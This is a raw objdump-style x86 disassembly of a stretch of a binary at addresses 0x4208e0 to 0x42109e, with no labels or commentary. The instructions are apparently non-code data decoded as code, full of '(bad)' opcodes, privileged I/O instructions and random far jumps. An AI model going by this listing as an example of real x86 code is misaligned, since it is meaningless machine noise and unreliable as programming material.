  4208e0:	sbb    edi,DWORD PTR [esp+ebp*2]
  4208e3:	test   DWORD PTR [edx+0x1c547cd6],0x749d3f3d
  4208ed:	mov    dl,0x37
  4208ef:	jae    0x420890
  4208f1:	ins    BYTE PTR es:[edi],dx
  4208f2:	mov    WORD PTR [eax+0x25],ds
  4208f5:	and    edx,edx
  4208f7:	push   esi
  4208f8:	add    al,0x6c
  4208fa:	cmc    
  4208fb:	icebp  
  4208fc:	adc    al,dl
  4208fe:	lea    ecx,[eax-0x7f5f7ce4]
  420904:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420905:	ffree  st(3)
  420907:	aam    0x3b
  420909:	jno    0x4208ee
  42090b:	xchg   BYTE PTR [edi],cl
  42090d:	(bad)  
  42090e:	je     0x420896
  420910:	pop    edx
  420911:	xor    BYTE PTR [eax+0x59],al
  420914:	jle    0x4208b2
  420916:	xor    eax,0x6053d57a
  42091b:	jbe    0x4208b5
  42091d:	stos   DWORD PTR es:[edi],eax
  42091e:	jl     0x4208e5
  420920:	in     eax,dx
  420921:	int3   
  420922:	inc    edi
  420923:	lock mov bh,0xbe
  420926:	jp     0x4208a9
  420928:	mov    edx,0xfa126d55
  42092d:	sub    BYTE PTR [eax],cl
  42092f:	retf   
  420930:	stos   BYTE PTR es:[edi],al
  420931:	dec    ebx
  420932:	retf   
  420933:	(bad)  
  420934:	xor    ch,BYTE PTR [ecx+0xe]
  420937:	jp     0x42091b
  420939:	add    bh,ch
  42093b:	xchg   ecx,eax
  42093c:	sti    
  42093d:	jns    0x4209a1
  42093f:	mov    edx,0x2ecdb959
  420944:	mov    bh,al
  420946:	clc    
  420947:	jo     0x420943
  420949:	pop    edi
  42094a:	mov    DWORD PTR [ebp*2+0x5016604a],ebp
  420951:	xchg   ebp,eax
  420952:	xlat   BYTE PTR ds:[ebx]
  420953:	stos   DWORD PTR es:[edi],eax
  420954:	inc    ebp
  420955:	mov    esp,0xce141d78
  42095a:	jmp    0x420940
  42095c:	fadd   QWORD PTR [eax]
  42095e:	out    0x41,eax
  420960:	sbb    dl,bh
  420962:	xchg   ebp,eax
  420963:	call   0xfe3cb83d
  420968:	inc    edx
  420969:	push   edi
  42096a:	mov    ds:0xa805e37,al
  42096f:	push   esp
  420970:	xor    ch,bl
  420972:	hlt    
  420973:	cli    
  420974:	ret    
  420975:	mov    BYTE PTR [ecx],bl
  420977:	cmp    BYTE PTR [edi-0x1b64a03c],0xb3
  42097e:	mov    cl,0x19
  420980:	lods   eax,DWORD PTR ds:[esi]
  420981:	lds    esp,FWORD PTR ds:0x35b28a0c
  420987:	add    BYTE PTR [eiz*8-0x5f0b0330],ah
  42098e:	push   esi
  42098f:	push   0xaf76fd1
  420994:	fnstcw WORD PTR [ebx-0x301c1dd2]
  42099a:	mov    bl,0x41
  42099c:	fwait
  42099d:	imul   esp,DWORD PTR [ecx+ecx*2-0x68],0x41
  4209a2:	dec    edi
  4209a3:	stc    
  4209a4:	sub    esp,DWORD PTR [esi]
  4209a6:	aam    0xca
  4209a8:	fdiv   st(7),st
  4209aa:	mov    ebp,0xade017bf
  4209af:	xchg   esp,eax
  4209b0:	test   al,0xcb
  4209b2:	sub    BYTE PTR [ebx-0xe],ah
  4209b5:	repz push esi
  4209b7:	mov    ebp,0x5c3b5c8a
  4209bc:	mov    ah,0x92
  4209be:	enter  0xe8fb,0xf0
  4209c2:	test   al,0x8a
  4209c4:	clc    
  4209c5:	je     0x420983
  4209c7:	push   0xffffff9e
  4209c9:	cmp    BYTE PTR [ebx+edi*1],dl
  4209cc:	daa    
  4209cd:	xchg   esp,eax
  4209ce:	xor    BYTE PTR [edi+edi*2+0x57],ah
  4209d2:	imul   DWORD PTR [esi+eiz*2+0x4ad510d5]
  4209d9:	rcl    DWORD PTR [esi+0x16],1
  4209dc:	and    eax,0x5579549c
  4209e1:	or     ebx,eax
  4209e3:	out    dx,al
  4209e4:	sti    
  4209e5:	cmp    eax,0x747884f8
  4209ea:	je     0x4209e7
  4209ec:	jno    0x420a66
  4209ee:	rcr    eax,cl
  4209f0:	mov    BYTE PTR [ecx+edx*2+0x6],0x5c
  4209f5:	mov    cl,0xab
  4209f7:	stos   DWORD PTR es:[edi],eax
  4209f8:	cmp    BYTE PTR [edx-0x58],dh
  4209fb:	inc    ebp
  4209fc:	inc    esp
  4209fd:	rsqrtps xmm2,xmm0
  420a00:	pop    esp
  420a01:	pop    esi
  420a02:	shr    DWORD PTR [edx+0x4e91f35a],1
  420a08:	mov    WORD PTR [ebx-0x15a8977a],gs
  420a0e:	mov    dl,0x0
  420a10:	push   es
  420a11:	ficom  DWORD PTR [edx]
  420a13:	rol    BYTE PTR [edi],1
  420a15:	or     BYTE PTR [edi+0x12],dl
  420a18:	shl    DWORD PTR [edx+esi*4],0x57
  420a1c:	ja     0x420a35
  420a1e:	cmp    al,0x52
  420a20:	loopne 0x420a61
  420a22:	in     eax,0x27
  420a24:	add    al,0x55
  420a26:	aam    0x2d
  420a28:	adc    bh,BYTE PTR [eax+0x3b9dd8fd]
  420a2e:	bound  eax,QWORD PTR [esi+esi*8-0x71]
  420a32:	pop    edi
  420a33:	enter  0x7b02,0xb0
  420a37:	scas   eax,DWORD PTR es:[edi]
  420a38:	inc    esi
  420a39:	adc    ch,ah
  420a3b:	mov    ds:0x51e077c0,al
  420a40:	loopne 0x420a11
  420a42:	pushf  
  420a43:	imul   DWORD PTR ds:0xed04df48
  420a49:	fdiv   DWORD PTR [esi-0x3b]
  420a4c:	test   DWORD PTR [ecx],esp
  420a4e:	dec    edx
  420a4f:	xchg   ebx,eax
  420a50:	mov    esp,0xa0ebba23
  420a55:	xchg   esi,eax
  420a56:	jl     0x420a61
  420a58:	addr16 int3 
  420a5a:	popf   
  420a5b:	xchg   ecx,eax
  420a5c:	jp     0x420a08
  420a5e:	div    ecx
  420a60:	retf   0x24f8
  420a63:	push   ebx
  420a64:	call   0x2cf4:0xedfb07bf
  420a6b:	scas   al,BYTE PTR es:[edi]
  420a6c:	repz (bad) 
  420a6e:	dec    ebx
  420a6f:	or     edi,DWORD PTR [edx-0x17ce5de3]
  420a75:	out    0x35,eax
  420a77:	mov    edi,0xdc05beb9
  420a7c:	cdq    
  420a7d:	pop    ebx
  420a7e:	mov    cs,ebx
  420a80:	gs jae 0x420ab6
  420a83:	inc    ecx
  420a84:	push   esp
  420a85:	dec    ecx
  420a86:	ja     0x420ae6
  420a88:	in     eax,dx
  420a89:	xchg   ecx,eax
  420a8a:	adc    BYTE PTR [di-0x1f8e],bl
  420a8f:	and    edx,DWORD PTR [ebp+0x43]
  420a92:	aaa    
  420a93:	inc    ebp
  420a94:	pop    es
  420a95:	mov    BYTE PTR [edi+0x31],bh
  420a98:	outs   dx,BYTE PTR ds:[esi]
  420a99:	dec    esp
  420a9a:	cmp    DWORD PTR [eax+0x6b],0x11d26ae0
  420aa1:	inc    ebp
  420aa2:	adc    esi,DWORD PTR [ebx]
  420aa4:	xor    eax,0x56d4e09e
  420aa9:	scas   al,BYTE PTR es:[edi]
  420aaa:	jmp    0x5fbe:0xab2e55f2
  420ab1:	aaa    
  420ab2:	ins    BYTE PTR es:[edi],dx
  420ab3:	jmp    0xe240:0xbe8db480
  420aba:	push   eax
  420abb:	fcom   QWORD PTR [ebx-0x51]
  420abe:	(bad)  
  420abf:	xchg   ecx,eax
  420ac0:	cmp    dh,al
  420ac2:	inc    edi
  420ac3:	inc    eax
  420ac4:	sub    BYTE PTR [esi+edi*4],cl
  420ac7:	in     al,0x5a
  420ac9:	sti    
  420aca:	fst    st(2)
  420acc:	sub    DWORD PTR es:[edx-0x7a69bfdc],ebp
  420ad3:	adc    al,0xc9
  420ad5:	sbb    dl,BYTE PTR [esi]
  420ad7:	stos   DWORD PTR es:[edi],eax
  420ad8:	pop    es
  420ad9:	mov    esp,0xf4e6ad5a
  420ade:	and    DWORD PTR [edx],ebp
  420ae0:	inc    eax
  420ae1:	fnstsw WORD PTR [edx]
  420ae3:	aam    0x33
  420ae5:	clc    
  420ae6:	xchg   esp,eax
  420ae7:	(bad)
  420aea:	or     ch,dh
  420aec:	imul   esp,esp,0xb4f215d4
  420af2:	pusha  
  420af3:	das    
  420af4:	fs sbb al,0x5a
  420af7:	cmp    esi,DWORD PTR [edi-0x69b7220a]
  420afd:	pushf  
  420afe:	add    eax,ebp
  420b00:	adc    al,0xfe
  420b02:	jmp    0x1e26ecb4
  420b07:	loop   0x420b53
  420b09:	mov    eax,ecx
  420b0b:	repz cwde 
  420b0d:	mul    DWORD PTR [eax-0x79]
  420b10:	sbb    dl,BYTE PTR [ecx-0x39]
  420b13:	fisttp DWORD PTR [edi+0x4d4a0cd0]
  420b19:	(bad)  
  420b1b:	dec    esp
  420b1c:	mov    edx,0x73fbdd4a
  420b21:	add    BYTE PTR [edi],dl
  420b23:	pop    esp
  420b24:	dec    edx
  420b25:	je     0x420ab5
  420b27:	push   esi
  420b28:	js     0x420aec
  420b2a:	rcr    BYTE PTR [edi],cl
  420b2c:	fs test cl,ah
  420b2f:	mov    ds:0x6bbc5785,eax
  420b34:	(bad)  
  420b35:	cmp    al,0x13
  420b37:	xchg   edx,eax
  420b38:	rcr    BYTE PTR [edi+0x42],0x62
  420b3c:	push   ds
  420b3d:	jmp    0x420b71
  420b3f:	shr    cl,0xa1
  420b42:	push   eax
  420b43:	test   BYTE PTR [esi+0x3a6d4309],al
  420b49:	mov    ch,0x7c
  420b4b:	repnz cmp eax,0xb7ae963
  420b51:	cld    
  420b52:	mov    dh,0xb3
  420b54:	or     al,0x81
  420b56:	cmp    esp,DWORD PTR [edx+ecx*8-0x7aa7391]
  420b5d:	push   edi
  420b5e:	gs stos BYTE PTR es:[edi],al
  420b60:	and    eax,edi
  420b62:	ja     0x420bdd
  420b64:	popf   
  420b65:	pop    edi
  420b66:	mov    bh,0x84
  420b68:	(bad)  
  420b6a:	mov    ebx,0x506d52c5
  420b6f:	test   dh,bh
  420b71:	ror    BYTE PTR [edi+edx*1-0x1a],1
  420b75:	shl    BYTE PTR [edi+0x975133a],cl
  420b7b:	in     al,0xec
  420b7d:	sub    ebp,DWORD PTR [eax]
  420b7f:	int3   
  420b80:	(bad)
  420b83:	daa    
  420b84:	ss stos DWORD PTR es:[edi],eax
  420b86:	sub    DWORD PTR [edx],esi
  420b88:	adc    al,BYTE PTR [esi]
  420b8a:	aaa    
  420b8b:	(bad)  
  420b8c:	fdivr  DWORD PTR [eax]
  420b8e:	sub    BYTE PTR ds:0x8abc342,bh
  420b94:	cmc    
  420b95:	repnz mov ch,0xa3
  420b98:	shr    ecx,0x37
  420b9b:	add    bl,BYTE PTR [ebx]
  420b9d:	add    edx,ebx
  420b9f:	adc    eax,0x14e8b4bf
  420ba4:	jb     0x420b5a
  420ba6:	adc    esi,esi
  420ba8:	xor    eax,0x510370bd
  420bad:	adc    al,0xb1
  420baf:	out    0x5b,eax
  420bb1:	(bad)  
  420bb2:	jge    0x420c28
  420bb4:	(bad)  
  420bb5:	xchg   esp,eax
  420bb6:	(bad)  [edx]
  420bb8:	xchg   esp,eax
  420bb9:	fld    st(1)
  420bbb:	in     eax,0xdc
  420bbd:	xchg   edi,esp
  420bbf:	xchg   ebx,eax
  420bc0:	cmp    al,0xde
  420bc2:	sub    edx,DWORD PTR [ecx-0x6a]
  420bc5:	cmp    eax,0x9cafc76e
  420bca:	push   ebx
  420bcb:	outs   dx,DWORD PTR ds:[esi]
  420bcc:	sub    BYTE PTR [edx+0x5a],bh
  420bcf:	js     0x420c4b
  420bd1:	pop    ds
  420bd2:	jge    0x420bba
  420bd4:	sbb    edi,ebx
  420bd6:	and    al,0xb9
  420bd8:	xchg   esp,eax
  420bd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bda:	fisubr DWORD PTR [ecx+0x7d]
  420bdd:	mov    ds:0xb46c6a92,al
  420be2:	clc    
  420be3:	dec    esp
  420be4:	cmp    DWORD PTR [esi-0x2f],esi
  420be7:	cmp    al,0x88
  420be9:	mov    bl,dl
  420beb:	out    0xa3,eax
  420bed:	or     ebp,0x4cd773e5
  420bf3:	push   0xffffff91
  420bf5:	inc    ebx
  420bf6:	popf   
  420bf7:	mov    dl,0xb
  420bf9:	imul   edx,DWORD PTR [ebx-0x334dbabe],0xf56cc50
  420c03:	enter  0x6b6e,0xf1
  420c07:	out    0xe9,eax
  420c09:	imul   esp,DWORD PTR [edi],0x37
  420c0c:	cmc    
  420c0d:	dec    ebp
  420c0e:	jle    0x420bb6
  420c10:	mov    bh,0x6d
  420c12:	or     DWORD PTR [esi-0x3e],eax
  420c15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c16:	sub    eax,0x36eb03e4
  420c1b:	daa    
  420c1c:	or     al,0xae
  420c1e:	sbb    esi,edx
  420c20:	adc    eax,0x69d6c11a
  420c25:	jo     0x420c22
  420c27:	arpl   WORD PTR [ebp+0x5b],di
  420c2a:	fwait
  420c2b:	or     DWORD PTR [ecx+0x2d],ecx
  420c2e:	ficom  WORD PTR [eax+eax*1-0x1ce66f1c]
  420c35:	mov    bh,0x31
  420c37:	jns    0x420c54
  420c39:	cwde   
  420c3a:	shr    DWORD PTR [edx+ecx*2-0x66ef8255],1
  420c41:	icebp  
  420c42:	mov    edi,0x8d9dfa86
  420c47:	jmp    0x420c19
  420c49:	sbb    eax,0x3641e5bd
  420c4e:	xor    edi,eax
  420c50:	xchg   BYTE PTR [ebx],bh
  420c52:	xchg   edx,eax
  420c53:	inc    ecx
  420c54:	rol    ch,0x58
  420c57:	and    ebp,DWORD PTR [eax-0x59]
  420c5a:	jbe    0x420c7a
  420c5c:	push   esi
  420c5d:	cmc    
  420c5e:	push   edx
  420c5f:	addr16 mov al,0xe8
  420c62:	aaa    
  420c63:	ds sub ecx,DWORD PTR cs:[ecx+0x7b]
  420c68:	mov    esp,0xefa88f6f
  420c6d:	or     edi,DWORD PTR [ecx]
  420c6f:	sub    BYTE PTR [esi],bh
  420c71:	jnp    0x420c75
  420c73:	js     0x420cc4
  420c75:	xor    ah,BYTE PTR [ebx+0x24c71b03]
  420c7b:	adc    edi,DWORD PTR [ecx-0x31d3095]
  420c81:	xchg   ebx,eax
  420c82:	loop   0x420c50
  420c84:	stc    
  420c85:	mov    ecx,0x59b00dd2
  420c8a:	pop    edx
  420c8b:	dec    edx
  420c8c:	mov    DWORD PTR ds:0x74ec5280,edx
  420c92:	inc    ebx
  420c93:	dec    esp
  420c94:	dec    esp
  420c95:	or     BYTE PTR [ecx-0x46],dl
  420c98:	das    
  420c99:	imul   ebx,ebp,0xffffffdc
  420c9c:	jbe    0x420cab
  420c9e:	or     esp,DWORD PTR ds:0x219e
  420ca3:	pusha  
  420ca4:	mov    ch,0xcf
  420ca6:	pop    edx
  420ca7:	sub    al,0xe0
  420ca9:	sub    DWORD PTR [esi-0x65],0xfe788663
  420cb0:	clc    
  420cb1:	(bad)  
  420cb2:	mov    cl,0x31
  420cb4:	lods   al,BYTE PTR ds:[esi]
  420cb5:	es push esi
  420cb7:	jmp    0x50a4:0xe8045dd5
  420cbe:	add    eax,0x7a52513f
  420cc3:	add    BYTE PTR [edx],0xce
  420cc6:	dec    ebp
  420cc7:	hlt    
  420cc8:	loop   0x420d27
  420cca:	fcom   DWORD PTR [edx-0x57c7eb85]
  420cd0:	mov    al,ds:0x79e4be0b
  420cd5:	inc    ebx
  420cd6:	mov    eax,ds:0xd7a35c7c
  420cdb:	lods   eax,DWORD PTR ds:[esi]
  420cdc:	xchg   esi,eax
  420cdd:	jle    0x420cbb
  420cdf:	out    dx,al
  420ce0:	or     DWORD PTR [esi],edx
  420ce2:	inc    esi
  420ce3:	lds    ebx,FWORD PTR [ebx+esi*4]
  420ce6:	sti    
  420ce7:	popa   
  420ce8:	rol    BYTE PTR [esi],cl
  420cea:	mov    BYTE PTR [edx+eax*8-0x40],ah
  420cee:	nop
  420cef:	pop    edi
  420cf0:	ficomp WORD PTR [eax-0x46b9a3a]
  420cf6:	xrelease mov BYTE PTR [ecx],bh
  420cf9:	and    BYTE PTR [ecx+0x77],al
  420cfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cfd:	push   0xa23f2dbb
  420d02:	xor    DWORD PTR [esi+esi*4-0x8d65073],edi
  420d09:	outs   dx,BYTE PTR ds:[esi]
  420d0a:	jnp    0x420d1e
  420d0c:	popa   
  420d0d:	std    
  420d0e:	out    0x9a,eax
  420d10:	aad    0xd
  420d12:	shr    DWORD PTR [edi+0x25],cl
  420d15:	dec    edx
  420d16:	add    eax,0x3f88ea4
  420d1b:	pop    ds
  420d1c:	sub    al,0xf1
  420d1e:	add    edi,DWORD PTR [ebx]
  420d20:	dec    ebx
  420d21:	das    
  420d22:	in     al,0xca
  420d24:	je     0x420d31
  420d26:	mov    esp,0x7f09e2b8
  420d2b:	sbb    dh,BYTE PTR [edx]
  420d2d:	xor    al,0x69
  420d2f:	xor    ch,BYTE PTR [eax+0x61]
  420d32:	dec    esp
  420d33:	shl    BYTE PTR [eax-0x1f],0x93
  420d37:	sub    BYTE PTR [eax],cl
  420d39:	div    ecx
  420d3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d3c:	add    eax,0x60cc7fee
  420d41:	or     al,0x64
  420d43:	cdq    
  420d44:	mov    al,al
  420d46:	inc    ecx
  420d47:	inc    esi
  420d48:	lds    ecx,FWORD PTR [ebp+0x68]
  420d4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d4c:	cmp    BYTE PTR [ebp-0x4d],bl
  420d4f:	inc    ecx
  420d50:	dec    esp
  420d51:	out    0xb3,eax
  420d53:	or     BYTE PTR [ebx-0x39],cl
  420d56:	sub    eax,DWORD PTR [eax-0x60]
  420d59:	mov    DWORD PTR [eax-0x61eb4df6],esp
  420d5f:	jl     0x420d30
  420d61:	xchg   ebx,eax
  420d62:	nop
  420d63:	repnz and al,ah
  420d66:	(bad)  
  420d67:	outs   dx,BYTE PTR ds:[esi]
  420d68:	ret    
  420d69:	mov    esi,0xb6638f61
  420d6e:	xor    edx,DWORD PTR [ebp-0x2a2f16c]
  420d74:	js     0x420d24
  420d76:	cli    
  420d77:	jns    0x420d23
  420d79:	fidiv  DWORD PTR [esi-0x65955247]
  420d7f:	repz int 0x19
  420d82:	cmp    ebx,ecx
  420d84:	sub    al,0xee
  420d86:	lock push ebp
  420d88:	jne    0x420dfa
  420d8a:	dec    esp
  420d8b:	add    DWORD PTR [eax+0x59],eax
  420d8e:	fisubr WORD PTR [bx+si+0x19]
  420d92:	xchg   DWORD PTR [ecx-0x69],edi
  420d95:	aam    0x9c
  420d97:	mov    bh,0x47
  420d99:	adc    BYTE PTR [ecx+0x7c],ah
  420d9c:	imul   eax,esp,0x2
  420d9f:	mov    BYTE PTR [edx+ebx*1],dl
  420da2:	mov    ecx,0xe6371f51
  420da7:	sbb    al,0x27
  420da9:	data16 fisubr WORD PTR [bp-0x47c4]
  420daf:	lods   eax,DWORD PTR ds:[esi]
  420db0:	and    ebp,esi
  420db2:	shl    DWORD PTR [eax-0x1fd43971],1
  420db8:	adc    ch,BYTE PTR [esi]
  420dba:	sbb    eax,0x844ed114
  420dbf:	jne    0x420d66
  420dc1:	mov    ch,0x6
  420dc3:	lds    esi,FWORD PTR [ecx+0x2]
  420dc6:	stos   BYTE PTR es:[edi],al
  420dc7:	jmp    0xf166:0xea9f21cb
  420dce:	fisub  WORD PTR [eax-0x43c9965d]
  420dd4:	rcr    DWORD PTR [ebx],1
  420dd6:	mov    al,ds:0xdf244919
  420ddb:	and    eax,0xba07121d
  420de0:	sbb    DWORD PTR ds:0x17b4eb7c,ecx
  420de6:	pop    es
  420de7:	mov    dl,0x41
  420de9:	xchg   edi,eax
  420dea:	and    al,0xf9
  420dec:	jns    0x420e6a
  420dee:	scas   al,BYTE PTR es:[edi]
  420def:	hlt    
  420df0:	jmp    0xe85b:0x6080c6a3
  420df7:	fsubr  st,st(4)
  420df9:	retf   
  420dfa:	or     BYTE PTR [esi-0x1f],ch
  420dfd:	push   ebx
  420dfe:	xlat   BYTE PTR ds:[ebx]
  420dff:	or     eax,0xbf51d796
  420e04:	push   0xedb3d4bb
  420e09:	xor    dl,al
  420e0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e0c:	sbb    al,dl
  420e0e:	out    0xf3,eax
  420e10:	call   0xc1e:0xdeba92d8
  420e17:	pop    ebp
  420e18:	mov    dl,0x45
  420e1a:	pop    ecx
  420e1b:	sub    ebp,0xffffff94
  420e1e:	dec    esp
  420e1f:	test   eax,0xabcec97c
  420e24:	inc    ebx
  420e25:	js     0x420e5e
  420e27:	pop    esi
  420e28:	dec    ebx
  420e29:	add    BYTE PTR [esi],0xaa
  420e2c:	and    eax,0x9a9390e1
  420e31:	mov    bl,0x2
  420e33:	push   esp
  420e34:	jns    0x420dff
  420e36:	and    ah,ah
  420e38:	mov    ebp,0xc62d5952
  420e3d:	(bad)  
  420e3e:	repz sar BYTE PTR [edx],1
  420e41:	mov    ch,0x3b
  420e43:	xor    eax,0xe87f3b82
  420e48:	mov    fs,WORD PTR [ebx+0x13]
  420e4b:	gs das 
  420e4d:	in     al,dx
  420e4e:	cmp    ebx,ebp
  420e50:	xchg   BYTE PTR [eax],al
  420e52:	sahf   
  420e53:	mov    edx,0xccf70a8a
  420e58:	mov    eax,ds:0x5a346ff1
  420e5d:	mov    edi,0xefa3e2ca
  420e62:	lahf   
  420e63:	test   al,0xf9
  420e65:	or     eax,0xedfc63c2
  420e6a:	xor    DWORD PTR [ebp+0x6b],edi
  420e6d:	xchg   BYTE PTR [ecx+0x5e8b01b9],bl
  420e73:	call   0xd27167d0
  420e78:	ror    BYTE PTR [ebx-0x2b8c047a],0x6c
  420e7f:	xchg   edi,eax
  420e80:	mov    ds:0x12219e9f,al
  420e85:	push   ebx
  420e86:	bound  ebx,QWORD PTR [eax+edx*1+0x65b2a578]
  420e8d:	push   esp
  420e8e:	(bad)  
  420e8f:	cmp    esp,DWORD PTR [edi+0x56c9b1f8]
  420e95:	hlt    
  420e96:	push   es
  420e97:	jae    0x420e25
  420e99:	push   edi
  420e9a:	cmp    esp,DWORD PTR [esi-0x64]
  420e9d:	in     eax,0xae
  420e9f:	and    esi,DWORD PTR ds:0x46e340b5
  420ea5:	imul   eax,DWORD PTR [esi],0x51
  420ea8:	mov    eax,ds:0xb0ff0f5b
  420ead:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420eae:	int3   
  420eaf:	push   0x3582157a
  420eb4:	mov    ch,0xbf
  420eb6:	call   0x7c28:0xae4aa972
  420ebd:	cmp    eax,0xd0bd826
  420ec2:	test   DWORD PTR [edx+0x7843a08b],esi
  420ec8:	jo     0x420e5e
  420eca:	and    eax,0x84b71191
  420ecf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ed0:	push   esi
  420ed1:	adc    BYTE PTR [ebp-0x7446b62c],dh
  420ed7:	dec    ecx
  420ed8:	mov    ah,0xa8
  420eda:	ret    
  420edb:	sub    ah,ch
  420edd:	xchg   esi,ebx
  420edf:	dec    ebp
  420ee0:	fs or  eax,0xc53d5685
  420ee6:	mov    ds:0x48cfa22c,al
  420eeb:	fldenv [ecx-0x23]
  420eee:	jo     0x420e82
  420ef0:	inc    edi
  420ef1:	cli    
  420ef2:	clc    
  420ef3:	mov    ebx,0x801d0287
  420ef8:	gs xchg ebx,eax
  420efa:	push   ebp
  420efb:	push   esi
  420efc:	fidiv  DWORD PTR [edx]
  420efe:	xchg   ecx,eax
  420eff:	ror    BYTE PTR [di+0x52],cl
  420f03:	xor    ecx,DWORD PTR [esp+edx*1-0x23]
  420f07:	addr16 xchg esi,eax
  420f09:	jg     0x420ec3
  420f0b:	dec    esp
  420f0c:	cs cmc 
  420f0e:	ret    0x95ea
  420f11:	jmp    0xa37845c1
  420f16:	add    al,0x3a
  420f18:	addr16 mov bh,0x98
  420f1b:	mov    ebp,DWORD PTR [eax]
  420f1d:	dec    BYTE PTR [eax+0x5f]
  420f20:	js     0x420ef5
  420f22:	cmp    ebx,DWORD PTR [ebx]
  420f24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f25:	pusha  
  420f26:	or     cl,BYTE PTR [ebx]
  420f28:	inc    edi
  420f29:	add    ax,0xae38
  420f2d:	outs   dx,BYTE PTR ds:[esi]
  420f2e:	out    0xfc,eax
  420f30:	sti    
  420f31:	loope  0x420f59
  420f33:	cmp    BYTE PTR [edi-0x21],0x1
  420f37:	setg   BYTE PTR [ecx+0x3037d13a]
  420f3e:	loop   0x420ef1
  420f40:	mov    edx,0x93177aad
  420f45:	gs data16 lahf 
  420f48:	retf   0x8ff6
  420f4b:	add    cl,BYTE PTR [ecx]
  420f4d:	pop    edi
  420f4e:	jmp    0x6626f811
  420f53:	push   ds
  420f54:	std    
  420f55:	xlat   BYTE PTR ds:[ebx]
  420f56:	sbb    al,0x6d
  420f58:	inc    esi
  420f59:	adc    esp,esp
  420f5b:	sbb    ebx,ebx
  420f5d:	ffreep st(1)
  420f5f:	mov    cl,0x8
  420f61:	and    bl,BYTE PTR [ebx+0x88bad5]
  420f67:	aad    0x6d
  420f69:	lea    esp,[edx]
  420f6b:	add    BYTE PTR [eax],bl
  420f6d:	inc    eax
  420f6e:	fldenv [esp+ecx*2]
  420f71:	inc    edx
  420f72:	adc    eax,0x78a2cf55
  420f77:	add    BYTE PTR [ecx+0x18f1d36b],0xa4
  420f7e:	je     0x420f71
  420f80:	dec    ecx
  420f81:	xchg   esp,eax
  420f82:	xchg   DWORD PTR [edx-0x46aa7b61],ebx
  420f88:	call   0x9c17b999
  420f8d:	into   
  420f8e:	fdivr  QWORD PTR [ebx-0x34]
  420f91:	in     eax,dx
  420f92:	mov    WORD PTR ds:0x8e9e556c,es
  420f98:	in     eax,0xfe
  420f9a:	cld    
  420f9b:	sbb    al,0xce
  420f9d:	adc    esi,DWORD PTR [eax]
  420f9f:	xchg   BYTE PTR [esi],cl
  420fa1:	fmul   st(1),st
  420fa3:	outs   dx,BYTE PTR ds:[esi]
  420fa4:	and    ebp,eax
  420fa6:	pushf  
  420fa7:	xchg   cl,cl
  420fa9:	xchg   DWORD PTR [ecx-0x12],eax
  420fac:	popa   
  420fad:	adc    bl,al
  420faf:	inc    ebx
  420fb0:	sub    bh,BYTE PTR ds:0x4cdf8c79
  420fb6:	outs   dx,DWORD PTR ds:[esi]
  420fb7:	add    ecx,DWORD PTR [esp+esi*4]
  420fba:	mov    ds:0xb2f1d1f1,eax
  420fbf:	mov    DWORD PTR [esi-0x49b60973],esp
  420fc5:	pop    ebx
  420fc6:	scas   eax,DWORD PTR es:[edi]
  420fc7:	pop    esi
  420fc8:	adc    ah,BYTE PTR [edx+0x38]
  420fcb:	sub    eax,0xdb8e2c7e
  420fd0:	mov    ebx,0xbab9e94e
  420fd5:	lds    esi,FWORD PTR fs:[eax+esi*1+0x1d0fa5d0]
  420fdd:	das    
  420fde:	pop    eax
  420fdf:	mov    cl,0xd1
  420fe1:	retf   
  420fe2:	and    DWORD PTR [ebx-0x48],edi
  420fe5:	add    DWORD PTR [ebp+edx*4+0x1c52efa4],edi
  420fec:	mov    WORD PTR [ecx+ebp*8-0x596a1837],?
  420ff3:	into   
  420ff4:	dec    ecx
  420ff5:	adc    eax,0x52646f00
  420ffa:	xchg   edx,eax
  420ffb:	pop    esi
  420ffc:	in     eax,0x51
  420ffe:	js     0x420ff3
  421000:	dec    edi
  421001:	mov    edi,0x71e7b2f4
  421006:	sub    DWORD PTR [ebp+0x3f],0xd
  42100a:	xlat   BYTE PTR ds:[ebx]
  42100b:	sbb    bl,BYTE PTR [edx+esi*1+0x0]
  42100f:	adc    DWORD PTR [ecx],esp
  421011:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421012:	in     al,0x52
  421014:	and    eax,0x38732512
  421019:	stc    
  42101a:	jl     0x421077
  42101c:	aas    
  42101d:	fdivr  QWORD PTR [ebx]
  42101f:	inc    esp
  421020:	mov    eax,ds:0xaadcf9cf
  421025:	mov    ebp,0x820c8c6b
  42102a:	nop
  42102b:	add    bl,bh
  42102d:	mov    ebp,0x37e2e1a0
  421032:	retf   0x81f0
  421035:	jae    0x420fcd
  421037:	xor    ch,BYTE PTR [edx-0x136dc0f]
  42103d:	jecxz  0x4210b7
  42103f:	mov    esi,0x6bae9f57
  421044:	cs inc edi
  421046:	ja     0x420feb
  421048:	push   esi
  421049:	jecxz  0x4210ae
  42104b:	unpckhps xmm0,XMMWORD PTR [esi+0x4b]
  42104f:	xchg   esp,eax
  421050:	(bad)  
  421051:	mov    ds:0xda6ffae,eax
  421056:	mov    ecx,0x898d5eca
  42105b:	shl    BYTE PTR [edi],1
  42105d:	mov    WORD PTR [edi-0x36],ss
  421060:	adc    al,0xf2
  421062:	sbb    eax,0xe5a87128
  421067:	test   al,0xaa
  421069:	sbb    al,0x5f
  42106b:	dec    esp
  42106c:	mov    cl,0xd9
  42106e:	inc    ecx
  42106f:	add    al,0xbe
  421071:	lds    ebp,FWORD PTR [ebx+0x27377e85]
  421077:	mov    ebp,0x26e8724a
  42107c:	pop    ss
  42107d:	and    DWORD PTR [edi+ebp*2-0x66c40779],ecx
  421084:	cmp    edi,DWORD PTR ds:0x2d602685
  42108a:	jecxz  0x4210f5
  42108c:	neg    BYTE PTR [ebx+0x494b1875]
  421092:	dec    ebp
  421093:	jo     0x4210ac
  421095:	cdq    
  421096:	out    0xad,al
  421098:	or     ebx,DWORD PTR [edi+0x60]
  42109b:	or     DWORD PTR [ebx+0x25],esi
  42109e:	test   DWORD PTR [eax-0x1033a464],eax
